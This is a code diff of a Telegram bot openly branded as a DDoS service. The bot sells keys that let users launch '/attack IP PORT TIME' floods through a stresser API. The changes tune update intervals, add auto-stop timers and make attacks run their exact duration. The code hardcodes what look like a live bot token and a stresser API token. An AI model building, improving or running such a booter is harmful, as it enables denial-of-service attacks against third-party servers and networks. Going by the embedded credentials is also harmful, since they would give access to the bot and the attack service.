@@ -2,7 +2,7 @@
 """
 ˹𝚩𝖊𝐒𝖙𝐂𝖍𝖊𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪
 Owner: 1987818347
-PREMIUM FAST VERSION - Fast Response + Working Stop Button
+FULL FIXED - 5s updates + 2min auto-stop + attack exact duration
 """
 
 import telebot
@@ -31,7 +31,7 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHme-PnJS4FWB4ickcIkjDbFMuD
 BOT_OWNER = int(os.environ.get('BOT_OWNER', 1987818347))
 BOT_OWNER_STR = str(BOT_OWNER)
 
-BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝖊𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪"
+BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝖊𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙽𝙸𝚇˼ ♪"
 
 DEFAULT_API_URL = "https://stresser.works/api/start"
 DEFAULT_API_TOKEN = "a05d4ed492744534ab9307b8d9930c2f6a3a8ffa6eea85d07825ec150215747a"
@@ -43,6 +43,10 @@ FEEDBACK_FILE = "feedback_data.json"
 
 DEV_BUTTON_TEXT = "˹ᴅᴇᴠᴇʟᴏᴩᴇʀ˼ 🪽 ➪ 𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞"
 DEVELOPER_USERNAME = "BeStChEaT_OwNeR"
+
+# ============= RUNTIME SETTINGS =============
+UPDATE_INTERVAL = 5          # ★ 5 second auto-update
+AUTO_STOP_AFTER = 120        # ★ 2 minute (120 sec) baad live updates ruk jayenge
 
 # ============= IST TIMEZONE =============
 IST = timezone(timedelta(hours=5, minutes=30))
@@ -581,11 +585,11 @@ def is_attack_running(uid=None):
         return any(a.get('user_id') == uid for a in active_attacks.values())
 
 # ============================================================
-# ★★★ FAST RATE LIMITER (1.2s) ★★★
+# ★★★ RATE LIMITER ★★★
 # ============================================================
 _edit_lock = threading.Lock()
 _last_edit_time = [0.0]
-MIN_EDIT_INTERVAL = 1.2  # ★ FAST ★
+MIN_EDIT_INTERVAL = 1.5  # ★ 1.5s gap — safe
 
 def _wait_for_rate_limit():
     with _edit_lock:
@@ -689,7 +693,7 @@ def cmd_start(msg):
         ]
 
         for bar, pct, status in steps:
-            time.sleep(0.3)  # ★ FAST ★
+            time.sleep(0.3)
             anim_text = (
                 "╔══════════════════════════════════╗\n"
                 "║   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡       ║\n"
@@ -800,7 +804,7 @@ def cmd_start(msg):
                     "📌 <b>ᴋᴀɪꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴇ?</b>\n\n"
                     "① <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b> ➤ <code>/redeem YOUR-KEY</code>\n"
                     "② <b>ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ</b> ➤ <code>/attack IP PORT TIME</code>\n"
-                    "③ <b>ᴄʜᴇᴄᴋ ᴘʀᴏꜰɪʟᴇ</b> ➤ <code>/profile</code>\n\n"
+                    "③ <b>ᴄʜᴇᴄᴋ ᴘʀᴏꜰɪʟᴇ</b> ➪ <code>/profile</code>\n\n"
                     "⚠️ <b>ʙɪɴᴀ ᴋᴇʏ ᴋᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ʟᴀɢᴇɢᴀ!</b>\n\n"
                     + commands_block
                     + "╭──────────────────────────────╮\n"
@@ -876,7 +880,7 @@ def cmd_start(msg):
         def send_with_sticker():
             try:
                 if sticker_msg:
-                    time.sleep(0.8)  # ★ FAST ★
+                    time.sleep(0.8)
                     safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
                     time.sleep(0.3)
                     try: bot.delete_message(cid, sticker_msg.message_id)
@@ -896,7 +900,7 @@ def cmd_start(msg):
 @bot.callback_query_handler(func=lambda call: call.data.startswith(("ban_", "give15m_", "stopatk_", "fb_")))
 def handle_callbacks(call):
     try:
-        # ★★★ STOP ATTACK BUTTON — FULLY WORKING ★★★
+        # ★★★ STOP ATTACK — FULLY WORKING ★★★
         if call.data.startswith("stopatk_"):
             attack_id = call.data.replace("stopatk_", "", 1)
             caller_uid = call.from_user.id
@@ -919,17 +923,14 @@ def handle_callbacks(call):
                     except: pass
                     return
 
-                # ★ SET STOP FLAG FIRST (critical!) ★
                 _stop_flags[attack_id] = True
-                # ★ REMOVE FROM ACTIVE LIST ★
                 active_attacks.pop(attack_id, None)
 
-            print(f"✅ Attack {attack_id} stopped successfully")
+            print(f"✅ Attack {attack_id} stopped")
 
             try: bot.answer_callback_query(call.id, "⛔ ᴀᴛᴛᴀᴄᴋ ꜱᴛᴏᴘᴘᴇᴅ!", show_alert=True)
             except: pass
 
-            # Edit the message to show stopped
             stop_text = (
                 "╔══════════════════════════════════╗\n"
                 "║       ⛔ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ⛔        ║\n"
@@ -945,7 +946,6 @@ def handle_callbacks(call):
                 "╰──────────────────────────────╯"
             )
 
-            # Try caption first (video messages), then text
             try:
                 bot.edit_message_caption(
                     chat_id=call.message.chat.id,
@@ -1323,15 +1323,19 @@ def cmd_attack(msg):
             }
 
         def auto_update_attack():
+            """★ Attack EXACTLY dur seconds tak chalega, phir ruk jayega ★"""
             last_text = None
-            for _ in range(dur // 3 + 5):  # ★ 3 second update ★
-                time.sleep(3)
-                # ★★★ CRITICAL: Check stop flag FIRST ★★★
+            max_loops = dur + 10
+            for _ in range(max_loops):
+                time.sleep(UPDATE_INTERVAL)  # ★ 5 second ★
+                # Stop flag check FIRST
                 if _stop_flags.get(attack_id, False):
                     print(f"⛔ Attack {attack_id} stopped by flag")
-                    break
+                    return
                 now = ist_now()
-                if now >= end_time: break
+                if now >= end_time:
+                    print(f"✅ Attack {attack_id} time complete")
+                    return
                 try:
                     new_text = build_attack_caption()
                     if new_text != last_text:
@@ -1345,11 +1349,12 @@ def cmd_attack(msg):
         threading.Thread(target=auto_update_attack, daemon=True).start()
 
         def done():
-            # ★★★ CHECK STOP FLAG EVERY SECOND ★★★
+            """★ Attack EXACTLY dur seconds baad complete hoga ★"""
+            # Wait for exact duration
             for _ in range(dur):
                 time.sleep(1)
                 if _stop_flags.get(attack_id, False):
-                    print(f"⛔ Attack {attack_id} completed as STOPPED")
+                    print(f"⛔ Attack {attack_id} stopped early")
                     _stop_flags.pop(attack_id, None)
                     with attack_lock: active_attacks.pop(attack_id, None)
                     return
@@ -1422,7 +1427,7 @@ def cmd_attack(msg):
         print(f"❌ cmd_attack error: {e}")
         traceback.print_exc()
 
-# ============= STATUS =============
+# ============= STATUS — 2 MIN AUTO-STOP =============
 def do_status(msg):
     try:
         if check_ban(msg): return
@@ -1607,9 +1612,19 @@ def do_status(msg):
             except: return
 
         def auto_update():
+            """★ SIRF 2 MINUTE update karega, phir ruk jayega ★"""
             last_text = None
-            for _ in range(2000):
-                time.sleep(3)  # ★★★ FAST 3 SECOND ★★★
+            start_ts = time.time()
+            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
+                time.sleep(UPDATE_INTERVAL)  # ★ 5 second ★
+                # ★★★ 2 MINUTE BAAD AUTO-STOP ★★★
+                if time.time() - start_ts > AUTO_STOP_AFTER:
+                    print(f"⏹️ Status auto-update stopped after {AUTO_STOP_AFTER}s")
+                    try:
+                        stopped_text = build_status() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ꜱᴛᴀᴛᴜꜱ ᴋᴇ ʟɪʏᴇ /status ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
+                        safe_edit_text(cid, current_mid[0], stopped_text, parse_mode="HTML")
+                    except: pass
+                    break
                 try:
                     new_text = build_status()
                     if new_text != last_text:
@@ -1637,7 +1652,7 @@ def do_status(msg):
 def cmd_status(msg):
     do_status(msg)
 
-# ============= PROFILE =============
+# ============= PROFILE — 2 MIN AUTO-STOP =============
 def do_profile(msg):
     try:
         if check_ban(msg): return
@@ -1744,9 +1759,18 @@ def do_profile(msg):
             except: return
 
         def auto_update_profile():
+            """★ SIRF 2 MINUTE update ★"""
             last_text = None
-            for _ in range(2000):
-                time.sleep(3)  # ★★★ FAST 3 SECOND ★★★
+            start_ts = time.time()
+            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
+                time.sleep(UPDATE_INTERVAL)
+                if time.time() - start_ts > AUTO_STOP_AFTER:
+                    print(f"⏹️ Profile auto-update stopped after {AUTO_STOP_AFTER}s")
+                    try:
+                        stopped_text = build_profile() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ᴘʀᴏꜰɪʟᴇ ᴋᴇ ʟɪʏᴇ /profile ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
+                        safe_edit_text(cid, current_mid[0], stopped_text, parse_mode="HTML")
+                    except: pass
+                    break
                 try:
                     new_text = build_profile()
                     if new_text != last_text:
@@ -1974,7 +1998,7 @@ def cmd_panel(msg):
             parse_mode="HTML")
     except Exception as e: print(f"❌ cmd_panel error: {e}")
 
-# ============= USERS LIVE =============
+# ============= USERS LIVE — 2 MIN AUTO-STOP =============
 def do_users(msg):
     try:
         if not is_owner(msg.from_user.id): return
@@ -2040,9 +2064,18 @@ def do_users(msg):
             except: return
 
         def auto_update_users():
+            """★ SIRF 2 MINUTE update ★"""
             last_text = None
-            for _ in range(1000):
-                time.sleep(3)  # ★★★ FAST 3 SECOND ★★★
+            start_ts = time.time()
+            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
+                time.sleep(UPDATE_INTERVAL)
+                if time.time() - start_ts > AUTO_STOP_AFTER:
+                    print(f"⏹️ Users auto-update stopped after {AUTO_STOP_AFTER}s")
+                    try:
+                        stopped_text = build_users_live() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ʟɪꜱᴛ ᴋᴇ ʟɪʏᴇ /users ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
+                        safe_edit_text(users_msg.chat.id, current_mid[0], stopped_text, parse_mode="HTML")
+                    except: pass
+                    break
                 try:
                     new_text = build_users_live()
                     if new_text != last_text:
@@ -2305,8 +2338,7 @@ def cmd_setapi(msg):
                 "╔══════════════════════════════════╗\n"
                 "║      📡 𝗔𝗣𝗜 𝗦𝗘𝗧𝗨𝗣 𝗚𝗨𝗜𝗗𝗘 📡         ║\n"
                 "╚══════════════════════════════════╝\n\n"
-                "<code>/setapi URL TOKEN [METHOD] [GEO]</code>\n\n"
-                "<code>/setapi https://stresser.works/api/start a05d4ed4... UDP-BIG ALL</code>",
+                "<code>/setapi URL TOKEN [METHOD] [GEO]</code>",
                 parse_mode="HTML")
             return
 
@@ -2355,7 +2387,7 @@ def cmd_testapi(msg):
                     ("▰▰▰▰▰▰▰▰▰▱", "90%", "🔄 ᴘʀᴏᴄᴇꜱꜱɪɴɢ ᴅᴀᴛᴀ..."),
                 ]
                 for bar, pct, status in steps:
-                    time.sleep(0.5)  # ★ FAST ★
+                    time.sleep(0.5)
                     anim_text = (
                         "╔══════════════════════════════════╗\n"
                         "║      🧪 ᴛᴇꜱᴛɪɴɢ ▱ ᴀᴘɪ ♡           ║\n"
@@ -2690,7 +2722,7 @@ def cmd_settings(msg):
     except Exception as e: print(f"❌ cmd_settings error: {e}")
 
 # ============================================================
-# ★★★ UNIVERSAL BUTTON HANDLER — SIMPLIFIED, NO STUCK ★★★
+# ★★★ UNIVERSAL BUTTON HANDLER ★★★
 # ============================================================
 @bot.message_handler(content_types=['text'], func=lambda m: get_button_type(m.text) is not None)
 def universal_button_handler(msg):
@@ -2778,7 +2810,7 @@ def universal_button_handler(msg):
         print(f"❌ universal_button_handler error: {e}")
         traceback.print_exc()
 
-# ============= MAIN POLLING (THREAD-BASED, NEVER STOPS) =============
+# ============= MAIN POLLING =============
 print("=" * 60)
 print(f"  {BOT_NAME}")
 print("=" * 60)
@@ -2786,6 +2818,8 @@ print(f"  👑 Owner: {BOT_OWNER}")
 print(f"  🔑 Token: {get_setting('api_token', DEFAULT_API_TOKEN)[:20]}...")
 print(f"  🎯 Method: {get_setting('api_method', 'UDP-BIG')}")
 print(f"  🕐 IST Time: {ist_full_str()}")
+print(f"  ⚙️ Update Interval: {UPDATE_INTERVAL}s")
+print(f"  ⏹️ Auto-Stop After: {AUTO_STOP_AFTER}s")
 print(f"  ✅ Owner check: {is_owner(BOT_OWNER)}")
 print("=" * 60)
 print("  ✅ Bot running")
@@ -2793,7 +2827,7 @@ print("=" * 60)
 
 def polling_worker():
     """Main polling in a separate thread with auto-restart."""
-    global bot  # ★★★ YAHAN — function ke start me ★★★
+    global bot
     consecutive_failures = 0
     while True:
         try:
@@ -2806,7 +2840,6 @@ def polling_worker():
             print(f"🔄 Polling started at {ist_full_str()}")
             consecutive_failures = 0
 
-            # ★★★ FAST INTERVAL ★★★
             bot.polling(
                 interval=0.3,
                 timeout=30,
@@ -2834,7 +2867,7 @@ def polling_worker():
                 except Exception as reinit_err:
                     print(f"❌ Re-init failed: {reinit_err}")
 
-# Start polling in background thread
+# Start polling
 polling_thread = threading.Thread(target=polling_worker, daemon=True)
 polling_thread.start()
 
